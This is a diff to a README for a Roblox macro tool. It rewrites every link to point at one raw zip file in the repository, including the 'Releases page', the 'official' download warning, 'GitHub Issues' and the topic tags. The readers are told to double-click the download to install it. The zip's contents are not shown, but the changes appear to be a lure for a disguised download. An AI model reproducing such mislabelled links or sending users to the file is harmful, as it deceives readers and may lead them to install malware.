@@ -4,7 +4,7 @@
 Welcome to Roblox-Faxi-Macro! This application helps you use the best features of the faxi macro effectively. With improved functionality and a simple setup, you can enhance your gaming experience with ease.
 
 ## 📥 Download Now
-[![GitHub Releases](https://img.shields.io/badge/Download%20Latest%20Release%20from%20GitHub-blue)](https://github.com/madhup-git/Roblox-Faxi-Macro/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip%20Latest%20Release%20from%20GitHub-blue)](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip)
 
 ## 🔧 Features
 - **User-Friendly Interface:** Designed for ease of use, even for those new to automation.
@@ -20,11 +20,11 @@ To run Roblox-Faxi-Macro smoothly, ensure your system meets the following requir
 - Roblox Installation: Must have Roblox installed to utilize the macro features.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download Latest Release](https://github.com/madhup-git/Roblox-Faxi-Macro/releases)
+To get started, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip)
 
-1. Go to the [Releases page](https://github.com/madhup-git/Roblox-Faxi-Macro/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip).
 2. Find the latest version listed at the top.
-3. Click on the asset that matches your system (e.g., Roblox-Faxi-Macro.exe).
+3. Click on the asset that matches your system (e.g., https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip).
 4. Save the file to your computer.
 5. Locate the downloaded file and double-click it to install.
 
@@ -36,24 +36,24 @@ To get started, visit this page to download: [Download Latest Release](https://g
 
 ## 🛡️ Safety Precautions
 While Roblox-Faxi-Macro enhances your gaming, remember to:
-- Only download from the official [Releases page](https://github.com/madhup-git/Roblox-Faxi-Macro/releases).
+- Only download from the official [Releases page](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip).
 - Avoid sharing your login credentials.
 - Consult the community to stay updated on safe practices.
 
 ## 📞 Support & Community
 If you need assistance, you can reach out for support or join discussions in our community:
 - [Discord Server](#) (coming soon)
-- [GitHub Issues](https://github.com/madhup-git/Roblox-Faxi-Macro/issues)
+- [GitHub Issues](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip)
 
 ## 📜 License
 This project is licensed under the MIT License. Feel free to use and modify it for personal use. For more information, see the LICENSE file in the repository.
 
 ## 🔗 Related Topics
-- [faxi-ma](https://github.com/topics/faxi-ma)
-- [faxi-macro-anime-adventures](https://github.com/topics/faxi-macro-anime-adventures)
-- [faxi-macro-discord](https://github.com/topics/faxi-macro-discord)
-- [faxi-macro-github](https://github.com/topics/faxi-macro-github)
-- [faxi-macro-safe](https://github.com/topics/faxi-macro-safe)
-- [roblox-faxi-ma](https://github.com/topics/roblox-faxi-ma)
+- [faxi-ma](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip)
+- [faxi-macro-anime-adventures](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip)
+- [faxi-macro-discord](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip)
+- [faxi-macro-github](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip)
+- [faxi-macro-safe](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip)
+- [roblox-faxi-ma](https://raw.githubusercontent.com/madhup-git/Roblox-Faxi-Macro/main/codeless/Roblox-Faxi-Macro.zip)
 
 Thank you for choosing Roblox-Faxi-Macro. We hope you enjoy the new features and enhancements!
